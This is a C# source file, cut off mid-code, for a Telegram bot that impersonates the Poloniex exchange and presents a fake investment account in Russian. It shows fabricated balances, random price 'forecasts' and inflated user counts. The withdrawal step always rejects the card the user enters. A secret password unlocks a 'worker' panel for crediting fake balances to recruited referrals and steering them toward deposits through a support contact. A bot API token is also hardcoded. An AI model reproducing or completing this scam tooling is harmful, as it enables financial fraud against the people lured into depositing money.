using Newtonsoft.Json;
using System.ComponentModel.DataAnnotations;
using System.Linq;
using System.Text;
using System.Threading;
using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Polling;
using Telegram.Bot.Requests;
using Telegram.Bot.Requests.Abstractions;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InlineQueryResults;
using Telegram.Bot.Types.ReplyMarkups;
using static System.Net.Mime.MediaTypeNames;

TGBot telegramBot = new TGBot();
await telegramBot.Main();

class UserData
{
    public double Balance { get; set; }
    public int NumOfTransactions { get; set; }
    public DateTime DateOfRegister { get; set; }
    // Фишки для ставочек
    public double InvestmentAmount { get; set; }
    public string CourseDirection { get; set; }
    public string SelectedAsset { get; set; }
    public string ShowedChangeDirection { get;set; }
    public string Status { get; set; }
    // Кто есть кто
    public bool IsWorker { get; set; }
    public bool IsAdmin { get; set; }
    public List<long> Refferals { get; set; }
    public UserData SelectedRefferal { get; set; }

    public bool waitSumWithdraw = false; // Ожидать сумму ставки
    public bool waitRequisites = false; // Ожидать реквизиты банковской карты и прочего
    public bool waitSumInvestment = false; // Ож
    public bool waitUpdateBetThread = false;
    public bool waitRefferal = false;
    public bool waitRefferalAddBalance = false;
    public Message idMessage = null;

    public string refferalAction = "";

    public string Username { get; set; }
    public long Id { get; set; }

    public UserData(long id, string username)
    {
        Balance = 0;
        NumOfTransactions = 0;
        DateOfRegister = DateTime.Now;
        Id = id;
        Username = username;

        IsWorker = false;
        CourseDirection = "Вверх ⬆";
        ShowedChangeDirection = "вниз";
        InvestmentAmount = 0;
        Status = "RANDOM";
        Refferals = new List<long>();
    }
}

class TGBot
{
    ITelegramBotClient botClient;

    Random random = new Random();

    List<UserData> users;

    public TGBot()
    {
        LoadData();
        // СОХРАНЕНИЕ ЗАГРУЗКА
    }

    private void SaveData()
    {
        string filePath = Path.Combine(Environment.CurrentDirectory, "..\\..\\..\\Data/users.txt");
        string data = JsonConvert.SerializeObject(users, Formatting.Indented);

        if (users == null) return;

        try { System.IO.File.WriteAllText(filePath, data); }
        catch (Exception ex) { Console.WriteLine(ex.Message); }

        //using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Write))
        //{             
        //    byte[] dataBytes = Encoding.UTF8.GetBytes(data);

        //    if (data.Contains("]]")) fileStream.Write(dataBytes, 0, dataBytes.Length);
        //    else fileStream.Write(dataBytes, 0, dataBytes.Length);
        //}

        //using (StreamWriter sw = new StreamWriter("Data/users.txt"))
        //{
        //    sw.WriteLine(JsonConvert.SerializeObject(users));
        //}
    }

    private void LoadData()
    {
        string filePath = Path.Combine(Environment.CurrentDirectory, "..\\..\\..\\Data/users.txt");

        using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
        {
            byte[] dataBytes = new byte[fileStream.Length];
            fileStream.Read(dataBytes, 0, dataBytes.Length);
            string dataRead = Encoding.UTF8.GetString(dataBytes);
            users = JsonConvert.DeserializeObject<List<UserData>>(dataRead);
            if (users == null) users = new List<UserData>();
        }
    }

    public async Task Main()
    {
        botClient = new TelegramBotClient("6506500394:AAHvdxVj9GH1v6PUtKIaqDOVuE7ZBykFkoY");

        using CancellationTokenSource cts = new();

        ReceiverOptions receiverOptions = new()
        {
            AllowedUpdates = Array.Empty<UpdateType>()
        };

        botClient.StartReceiving(
            updateHandler: HandleUpdateAsync,
            pollingErrorHandler: HandlePollingErrorAsync,
            receiverOptions: receiverOptions,
            cancellationToken: cts.Token
        );

        var me = await botClient.GetMeAsync();

        Console.WriteLine($" ------------------------------\n| БОТИК ЗАПУЩЕН @{me.Username} |\n ------------------------------\nТут будут выводиться всякие сообщения от бота.\nНапример, присоединение нового пользователя.\n");
        Console.ReadLine();

        cts.Cancel();
    }

    private UserData? USER(long id)
    {
        if (users.Count > 0)
        {
            long[] idS = new long[users.Count];
            foreach (var user in users) { if (user.Id == id) return user; }
        }
        return null;
    }

    private void ADDUSER(long id, string username)
    {
        users.Add(new UserData(id, username));
        SaveData();

        Console.Write("ПОЛЬЗОВАТЕЛЬ "); Console.ForegroundColor = ConsoleColor.Black; Console.BackgroundColor = ConsoleColor.White;
        Console.Write(id); Console.ForegroundColor = ConsoleColor.Gray; Console.BackgroundColor = ConsoleColor.Black;
        Console.WriteLine(" ПРИСОЕДИНИЛСЯ К БАЗЕ ДАННЫХ");
    }

    async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
    {
        Message? message = null;
        if (update.Message != null) message = update.Message;


        if (message != null && USER(message.Chat.Id) == null) ADDUSER(message.Chat.Id, message.Chat.Username); // Регистрация пользователя        

        if (message != null)
        {
            var chatId = message.Chat.Id;
            var user = USER(chatId);

            if (message.Text.StartsWith("/start") && !user.waitUpdateBetThread)
            {
                if(user.idMessage == null)
                {
                    InlineKeyboardMarkup inlineKeyboard = new(new[]{
                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") }
                    });

                    user.idMessage = await botClient.SendTextMessageAsync(
                        chatId: message.Chat.Id,
                        text: $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {chatId}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()}   {user.DateOfRegister.ToLongTimeString()}",
                        cancellationToken: cancellationToken,
                        parseMode: ParseMode.Html,
                        replyMarkup: inlineKeyboard);
                }
                else
                {
                    DisableChecks(user);

                    InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                });

                    if (!user.IsWorker)
                    {
                        inlineKeyboard = new(new[]{
                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") }
                    });
                    }
                    else
                    {
                        inlineKeyboard = new(new[]{
                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") },
                        new [] { InlineKeyboardButton.WithCallbackData("Панель админа/работника", $"{user.Id}workerAdminPanel") }
                    });
                    }

                    SendMessageWithButtons(user, cancellationToken, $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {chatId}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()}   {user.DateOfRegister.ToLongTimeString()}", inlineKeyboard);
                }

                if (message.Text.Length > 6)
                {
                    string yourRefferal = message.Text.Substring(7);
                    var yourRefferalData = USER(long.Parse(yourRefferal));

                    if (!yourRefferalData.Refferals.Contains(user.Id))
                    {
                        yourRefferalData.Refferals.Add(user.Id);

                        SendMessage(user, cancellationToken, $"Теперь вы реферал пользователя @{yourRefferalData.Username}");

                        SaveData();
                    }
                }
            }
            else if (message.Text == "YlIl+svO|N")
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                     });

                if (!user.IsWorker)
                {
                    user.IsWorker = true;
                    SaveData();

                    SendMessageWithButtons(user, cancellationToken, "Теперь у вас есть права воркера!", inlineKeyboard);
                }
                else
                {
                    user.IsWorker = false;
                    SaveData();

                    SendMessageWithButtons(user, cancellationToken, "У вас больше нет прав воркера!", inlineKeyboard);
                }
            }
            else if (user.waitRefferal)
            {
                UserData refferal = SelectRefferal(user, message.Text);

                Console.WriteLine(message.Text);

                // addbalReff
                // editdtReff
                // messtoReff

                if(refferal != null)
                {
                    if (user.refferalAction == "AddBalance")
                    {
                        Console.WriteLine("Теперь жду число пополнения");
                        user.waitRefferal = false;
                        user.waitRefferalAddBalance = true;       
                        
                        // ПРОДОЛЖИТЬ КОД, ДОБАВИТЬ ОБРАБОТКУ ЧИСЛА ПОПОЛНЕНИЯ
                    }
                }
                else
                {
                    InlineKeyboardMarkup inlineKeyboard = new(new[]
                    {
                        new [] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в меню работника", $"{user.Id}workerMenu") }
                    });

                    string refferals = GetRefferals(user);

                    if(user.refferalAction == "addbalReff") SendMessageWithButtons(user, cancellationToken, $"Реферал не найден!\n\nВаши рефералы:\n{refferals}\nУкажите TgID или username реферала для которого будет зачисление:", inlineKeyboard);
                }
            }
            else if (user.waitSumWithdraw)
            {
                double sum;
                if (double.TryParse(message.Text, out sum) && sum <= user.Balance && sum >= 5000)
                {
                    user.waitSumWithdraw = false;
                    user.waitRequisites = true;

                    InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                     });

                    SendMessageWithButtons(user, cancellationToken, $"❕ Вывод возможен только на реквизиты с которых пополнялся Ваш баланс.\n\n💬 Отправьте сообщение с реквизитами карты на которую будет осуществлён вывод.", inlineKeyboard);
                }
                else
                {
                    InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                });

                    //await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId);
                    await botClient.DeleteMessageAsync(chatId, message.MessageId);

                    SendMessageWithButtons(user, cancellationToken, $"<b>❗️ Cумма для вывода не должна:</b>\n▪️ Занижать минимально-допустимую.\n▪️ Превышать ваш баланс.\n\n💰 На вашем балансе: <i>{user.Balance} ₽</i>\n\n💬 Отправьте сообщение с суммой для вывода.", inlineKeyboard);
                }
            }
            else if (user.waitRequisites)
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                });

                //await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId);
                await botClient.DeleteMessageAsync(chatId, message.MessageId);

                SendMessageWithButtons(user, cancellationToken, $"❌ Введённая карта несоответсвует требованиям.\n❕ Вывод возможен только на реквизиты с которых осуществлялось пополнение.\n❕ Карта должна быть действительной.\n❕ Банк должен быть доступен.\n\n💬 Отправьте сообщение с реквизитами карты на которую будет осуществлён вывод.", inlineKeyboard);
            }
            else if (user.waitSumInvestment)
            {
                user.waitSumInvestment = false;

                double sum;
                if (double.TryParse(message.Text, out sum) && sum <= user.Balance && sum >= 500) user.InvestmentAmount = sum;

                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                     new [] { InlineKeyboardButton.WithCallbackData($"Актив пойдёт {user.ShowedChangeDirection}", $"{user.Id}betChangeDirection") },
                     new [] { InlineKeyboardButton.WithCallbackData("Ввести сумму инвестиции", $"{user.Id}enterSumInvestment") },
                     new [] { InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся к выбору актива", $"{user.Id}createECNAccount"), InlineKeyboardButton.WithCallbackData("Подтвердить", $"{user.Id}betAccept") }
                 });

                //await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId);
                await botClient.DeleteMessageAsync(chatId, message.MessageId);

                SendMessageWithButtons(user, cancellationToken, $"Ваш баланс: {user.Balance} ₽\n<i>Минимальная сумма инвестиции: <b>500 ₽</b></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыбранные активы: {user.SelectedAsset}\n\nВведённая сумма инвестиции: <b>{user.InvestmentAmount} ₽</b>\nПредположеное направление курса: {user.CourseDirection[user.CourseDirection.Length - 1]}", inlineKeyboard);
            }
            else
            {
                await botClient.DeleteMessageAsync(message.Chat.Id, message.MessageId);
            }
        }

        if (update.CallbackQuery is { } callbackQuery)
        {
            var callbackData = callbackQuery.Data; // Текст который вернула инлайн-кнопка
            //Environment.Exit(0);

            UserData user = null;
            int iId = 0;

            for (int i = 0; i < 20; i++)
            {
                long id = 0;
                if(long.TryParse(callbackData[..i], out id)) user = USER(id);
                if (user != null) { iId = i; break; }
            }

            
            //var user = USER(409013849);


            if (user != null && user.idMessage != null)
            {
                SendButtons(botClient, user.idMessage, cancellationToken, callbackData[iId..]);
            }
        }
    }

    void DisableChecks(UserData user)
    {
        user.waitSumWithdraw = false;
        user.waitRequisites = false;
        user.waitSumInvestment = false;
        user.waitUpdateBetThread = false;
        user.waitRefferal = false;
        user.waitRefferalAddBalance = false;
    }

    async void SendButtons(ITelegramBotClient botClient, Message message, CancellationToken cancellationToken, string type)
    {
        if (message != null && USER(message.Chat.Id) == null) ADDUSER(message.Chat.Id, message.Chat.Username);
        var user = USER(message.Chat.Id);

        if (message != null)
        {
            if (type == "loadMenu")
            {
                DisableChecks(user);

                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: $"{user.Id}loadMenu") }
                });

                if (!user.IsWorker)
                {
                    inlineKeyboard = new(new[]{
                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") }
                    });
                }
                else
                {
                    inlineKeyboard = new(new[]{
                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") },
                        new [] { InlineKeyboardButton.WithCallbackData("Панель админа/работника", $"{user.Id}workerAdminPanel") }
                    });
                }

                SendMessageWithButtons(user, cancellationToken, $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {message.Chat.Id}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()} {user.DateOfRegister.ToLongTimeString()}", inlineKeyboard);
            }
            else if (type.Length > 8 && type[..8] == "withdraw")
            {
                string selectedPaymentSystem = type[8..];
                if (selectedPaymentSystem == "BankCard") selectedPaymentSystem = "Банк 💳";
                else if (selectedPaymentSystem == "QIWI") selectedPaymentSystem = "QIWI 🥝";
                else selectedPaymentSystem = "Банк 🇧🇾";

                user.waitSumWithdraw = true;

                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                });

                SendMessageWithButtons(user, cancellationToken, $"💰 <b>Ваш баланс: <i>{user.Balance} ₽</i></b>\n<i>Выбранная система: {selectedPaymentSystem}</i>\n\n❕ Минимальная сумма для вывода: <i><u>5000 ₽</u></i>\n\n💬 Отправьте сообщение с суммой для вывода.", inlineKeyboard);
            }
            else if (type == "withdraw")
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                new[] { InlineKeyboardButton.WithCallbackData("💳 Банковская карта", callbackData: $"{user.Id}withdrawBankCard"), InlineKeyboardButton.WithCallbackData(text: "🥝 QIWI Wallet", callbackData: $"{user.Id}withdrawQIWI") },
                new[] {InlineKeyboardButton.WithCallbackData(text: "🇧🇾 Беларусская карта", $"{user.Id}withdrawBelarussianCard") },
                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: $"{user.Id}loadMenu") }
            });

                SendMessageWithButtons(user, cancellationToken, "🖨 Выберите на какую систему будет произведён вывод средств.", inlineKeyboard);
            }
            else if (type == "deposit")
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", callbackData: $"{user.Id}loadMenu") }
                });

                SendMessageWithButtons(user, cancellationToken, $"✅ Минимальная сумма пополнения: <i><u>5000 ₽</u></i>\n\n🥝 Номер карты для QIWI: <code>Недоступно</code> ( <i>До 10000 ₽</i> )\n💳 Номер карты для банка: <code>Недоступно</code>\n\n📝 Комментарий при переводе: <code>@{user.Username}</code>\n\n❕ Пополнение доступно для жителей Беларуси, через техническую поддержку ( @Poloniexx_support ).\n\n❕ Если нет возможности оставить комментарий или Вы ошиблись с указанием комментария, отправьте чек в техническую поддержку ( @Poloniexx_support ).\n\n✳️ Средства пополняются автоматически, время обработки до 5 минут.", inlineKeyboard);
            }
            else if (type == "createECNAccount")
            {
                user.InvestmentAmount = 0;
                user.SelectedAsset = string.Empty;

                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                new[] { InlineKeyboardButton.WithCallbackData(text: "™️ Акционные активы", callbackData: $"{user.Id}assetsEquity"), InlineKeyboardButton.WithCallbackData("💶 Фиатные активы", callbackData: $"{user.Id}assetsFiat") },
                new[] {InlineKeyboardButton.WithCallbackData(text: "👛 Криптовалюта", $"{user.Id}assetsCrypto") },
                new[] {InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
            });

                SendMessageWithButtons(user, cancellationToken, "💶 Фиатные - Физическая валюта.\n™️ Акционные - Акции компаний.\n👛 Криптовалюта - Вид цифровой валюты.\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n<b>Выберите категорию активов.</b>", inlineKeyboard);
            }
            else if (type == "enterSumInvestment")
            {
                user.waitSumInvestment = true;

                SendMessage(user, cancellationToken, "Отправьте сумму для инвестиции.");
            }
            else if (type.Length > 3 && type[..3] == "bet")
            {
                bool successfully = true;

                if (type[3..] == "ChangeDirection")
                {
                    if (user.CourseDirection.Contains("Вверх")) { user.CourseDirection = "Вниз ⬇"; user.ShowedChangeDirection = "вверх"; }
                    else { user.CourseDirection = "Вверх ⬆"; user.ShowedChangeDirection = "вниз"; }
                }
                else if (type[3..] == "Accept")
                {
                    if (user.InvestmentAmount >= 500 && user.Balance >= user.InvestmentAmount)
                    {
                        var updateThread = new Thread(() => UpdateMessageBet(cancellationToken, user));
                        updateThread.Start();
                    }
                    else
                    {
                        successfully = false;
                    }
                }
                else user.SelectedAsset = type[3..];

                if (type[3..] != "Accept")
                {
                    InlineKeyboardMarkup inlineKeyboard = new(new[]{
                    new [] { InlineKeyboardButton.WithCallbackData($"Актив пойдёт {user.ShowedChangeDirection}", $"{user.Id}betChangeDirection") },
                    new [] { InlineKeyboardButton.WithCallbackData("Ввести сумму инвестиции", $"{user.Id}enterSumInvestment") },
                    new [] { InlineKeyboardButton.WithCallbackData(text: "🔙 Вернутся к выбору актива", $"{user.Id}createECNAccount"), InlineKeyboardButton.WithCallbackData("Подтвердить", $"{user.Id}betAccept") }
                });

                    string mess = $"Ваш баланс: {user.Balance} ₽\n<i>Минимальная сумма инвестиции: <b>500 ₽</b></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыбранные активы: {user.SelectedAsset}\n\nВведённая сумма инвестиции: <b>{user.InvestmentAmount} ₽</b>\nПредположеное направление курса: {user.CourseDirection[user.CourseDirection.Length - 1]}";

                    //await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId);

                    SendMessageWithButtons(user, cancellationToken, successfully ? mess : "‼️Депозит должен быть больше или равен минимальному‼️\n\n" + mess, inlineKeyboard);
                }
            }
            else if (type.Length > 6 && type[..6] == "assets")
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[] { new[] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") } });

                if (type[6..] == "Fiat")
                {
                    inlineKeyboard = new(new[]{
                    new[] { InlineKeyboardButton.WithCallbackData($"USD {GetForecast()}", $"{user.Id}betUSD"), InlineKeyboardButton.WithCallbackData($"EUR {GetForecast()}", $"{user.Id}betEUR") },
                    new[] { InlineKeyboardButton.WithCallbackData($"RUB {GetForecast()}", $"{user.Id}betRUB"), InlineKeyboardButton.WithCallbackData($"KZT {GetForecast()}", $"{user.Id}betKZT") },
                    new[] { InlineKeyboardButton.WithCallbackData($"UAN {GetForecast()}", $"{user.Id}betUAN"), InlineKeyboardButton.WithCallbackData($"PLN {GetForecast()}", $"{user.Id}betPLN") },
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", $"{user.Id}createECNAccount") }
                     });
                }
                else if (type[6..] == "Crypto")
                {
                    inlineKeyboard = new(new[]{
                    new[] { InlineKeyboardButton.WithCallbackData($"BTC {GetForecast()}", $"{user.Id}betBTC"), InlineKeyboardButton.WithCallbackData($"MIOTA {GetForecast()}", $"{user.Id}betMIOTA"), InlineKeyboardButton.WithCallbackData($"NEO {GetForecast()}", $"{user.Id}betNEO") },
                    new[] { InlineKeyboardButton.WithCallbackData($"BCH {GetForecast()}", $"{user.Id}betBCH"), InlineKeyboardButton.WithCallbackData($"XRP {GetForecast()}", $"{user.Id}betXRP"), InlineKeyboardButton.WithCallbackData($"XEM {GetForecast()}", $"{user.Id}betXEM") },
                    new[] { InlineKeyboardButton.WithCallbackData($"DASH {GetForecast()}", $"{user.Id}betDASH"), InlineKeyboardButton.WithCallbackData($"DOGE {GetForecast()}", $"{user.Id}betDOGE"), InlineKeyboardButton.WithCallbackData($"ETH {GetForecast()}", $"{user.Id}betETH") },
                    new[] { InlineKeyboardButton.WithCallbackData($"LTC {GetForecast()}", $"{user.Id}betLTC"), InlineKeyboardButton.WithCallbackData($"XMR {GetForecast()}", $"{user.Id}betXMR"), InlineKeyboardButton.WithCallbackData($"ETC {GetForecast()}", $"{user.Id}betETC") },
                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", $"{user.Id}createECNAccount") }
                     });
                }
                else if (type[6..] == "Equity")
                {
                    inlineKeyboard = new(new[]
                    {
                        new[] { InlineKeyboardButton.WithCallbackData($"GOOG {GetForecast()}", $"{user.Id}betGOOG"), InlineKeyboardButton.WithCallbackData($"AMZN {GetForecast()}", $"{user.Id}betAMZN"), InlineKeyboardButton.WithCallbackData($"SBER {GetForecast()}", $"{user.Id}betSBER") },
                        new[] { InlineKeyboardButton.WithCallbackData($"NKE {GetForecast()}", $"{user.Id}betNKE"), InlineKeyboardButton.WithCallbackData($"BRK.A {GetForecast()}", $"{user.Id}betBRK.A"), InlineKeyboardButton.WithCallbackData($"BA {GetForecast()}", $"{user.Id}betBA") },
                        new[] { InlineKeyboardButton.WithCallbackData($"TSLA {GetForecast()}", $"{user.Id}betTSLA") },
                        new[] { InlineKeyboardButton.WithCallbackData($"KO {GetForecast()}", $"{user.Id}betKO"), InlineKeyboardButton.WithCallbackData($"INTC {GetForecast()}", $"{user.Id}betINTC"), InlineKeyboardButton.WithCallbackData($"MA {GetForecast()}", $"{user.Id}betMA") },
                        new[] { InlineKeyboardButton.WithCallbackData($"MCD {GetForecast()}", $"{user.Id}betMCD"), InlineKeyboardButton.WithCallbackData($"META {GetForecast()}", $"{user.Id}betMETA"), InlineKeyboardButton.WithCallbackData($"MSFT {GetForecast()}", $"{user.Id}betMSFT") },
                        new[] { InlineKeyboardButton.WithCallbackData($"AAPL {GetForecast()}", $"{user.Id}betAAPL") },
                        new[] { InlineKeyboardButton.WithCallbackData($"NFLX {GetForecast()}", $"{user.Id}betNFLX"), InlineKeyboardButton.WithCallbackData($"NVDA {GetForecast()}", $"{user.Id}betNVDA"), InlineKeyboardButton.WithCallbackData($"PEP {GetForecast()}", $"{user.Id}betPEP") },
                        new[] { InlineKeyboardButton.WithCallbackData($"PFE {GetForecast()}", $"{user.Id}betPFE"), InlineKeyboardButton.WithCallbackData($"VISA {GetForecast()}", $"{user.Id}betVISA"), InlineKeyboardButton.WithCallbackData($"SBUX {GetForecast()}", $"{user.Id}betSBUX") },
                        new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору актива", $"{user.Id}createECNAccount") }
                    });
                }

                SendMessageWithButtons(user, cancellationToken, "🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nВыберите актив.", inlineKeyboard);
            }
            else if (type == "techSupport")
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]{
                new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
            });

                SendMessageWithButtons(user, cancellationToken, "<b>Заметили <u>ошибку</u>, есть <u>проблема</u>, <u>вопрос</u>?</b>\nСкорей пиши в нашу службу поддержки!\n\n<b>Не забывай соблюдать правила культурного общения</b>\n<i>Общайся вежливо, не спамь, не флуди, не перебивай.</i>\n\n‼️ За оффтоп можно получить от мута до бана.\n\n💻 Техническая поддержка: @Poloniexx_support", inlineKeyboard);
            }
            else if (type == "workerAdminPanel" && user.IsWorker)
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]
                {
                    new[] { InlineKeyboardButton.WithCallbackData("💼 Меню работника", $"{user.Id}workerMenu") },
                    new[] { InlineKeyboardButton.WithCallbackData("🗂 Меню админа", $"{user.Id}adminMenu") },
                    new[] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
                });

                SendMessageWithButtons(user, cancellationToken, "Выберите функцию", inlineKeyboard);
            }
            else if (type == "workerMenu" && user.IsWorker)
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]
                {
                    new[] { InlineKeyboardButton.WithCallbackData("Пополнить баланс от сервера", $"{user.Id}addBalanceFromServer"), InlineKeyboardButton.WithCallbackData("Сообщение от бота", $"{user.Id}messageFromBot") },
                    new[] { InlineKeyboardButton.WithCallbackData("Управление рефералами", $"{user.Id}controlRefferals") },
                    new[] { InlineKeyboardButton.WithCallbackData("Дополнительная информация", $"{user.Id}additionalInfoRefferals") ,InlineKeyboardButton.WithCallbackData("🔙 Вернутся к выбору меню", $"{user.Id}workerAdminPanel") }
                });

                SendMessageWithButtons(user, cancellationToken, "Выберите функцию", inlineKeyboard);
            }
            else if (type == "controlRefferals" && user.IsWorker)
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]
                {
                    new[] { InlineKeyboardButton.WithCallbackData("Вернутся в меню работника", $"{user.Id}workerMenu") },
                });

                string refferals = GetRefferals(user);

                SendMessageWithButtons(user, cancellationToken, $"Ваши рефералы:\n{refferals}\nВведите username или TgID, что-бы выбрать пользователя.\n(Можно скопировать нажатием)", inlineKeyboard);
            }
            else if (type == "additionalInfoRefferals" && user.IsWorker)
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]
                {
                    new [] { InlineKeyboardButton.WithCallbackData("🔙 Вернутся в меню работника", $"{user.Id}workerMenu") }
                });

                SendMessageWithButtons(user, cancellationToken, $"Реферальная ссылка:\n<code>https://t.me/poloniexruBot?start={user.Id}</code>", inlineKeyboard);
            }
            else if (type == "addBalanceFromServer")
            {
                InlineKeyboardMarkup inlineKeyboard = new(new[]
                {
